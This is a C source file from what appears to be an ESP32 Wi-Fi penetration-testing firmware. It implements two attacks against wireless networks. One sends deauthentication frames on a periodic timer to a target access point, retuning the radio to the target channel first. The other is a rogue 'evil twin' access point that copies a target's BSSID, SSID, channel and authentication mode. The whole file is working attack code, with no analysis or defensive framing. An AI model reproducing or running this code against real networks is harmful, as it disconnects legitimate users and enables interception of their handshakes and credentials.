/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle = NULL;

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP
 * 
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_ms){
    if (ap_record == NULL || ap_record->primary == 0) {
        ESP_LOGE(TAG, "Cannot start broadcast deauth without a valid AP record");
        return;
    }
    if (period_ms == 0) {
        ESP_LOGW(TAG, "Invalid broadcast period, using 100 ms");
        period_ms = 100;
    }
    if (wifictl_sniffer_is_active()) {
        /* The sniffer already put the radio on the target channel. Reconfiguring
           the management AP here would restart the AP and break the capture,
           so only nudge the channel. */
        wifictl_set_channel(ap_record->primary);
    } else {
        /* No sniffer: in APSTA mode the management AP owns the channel and a
           plain esp_wifi_set_channel() is undone by the running AP, so the AP
           has to be reconfigured to actually move the radio. */
        wifictl_move_mgmt_ap_to_channel(ap_record->primary);
    }
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create deauth timer: %s", esp_err_to_name(err));
        return;
    }
    err = esp_timer_start_periodic(deauth_timer_handle, (uint64_t) period_ms * 1000ULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start deauth timer: %s", esp_err_to_name(err));
        esp_timer_delete(deauth_timer_handle);
    }
}

void attack_method_broadcast_stop(){
    if (deauth_timer_handle == NULL) return;
    if (esp_timer_is_active(deauth_timer_handle)) {
        esp_err_t err = esp_timer_stop(deauth_timer_handle);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to stop deauth timer: %s", esp_err_to_name(err));
        }
    }
    esp_timer_delete(deauth_timer_handle);
    deauth_timer_handle = NULL;
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}
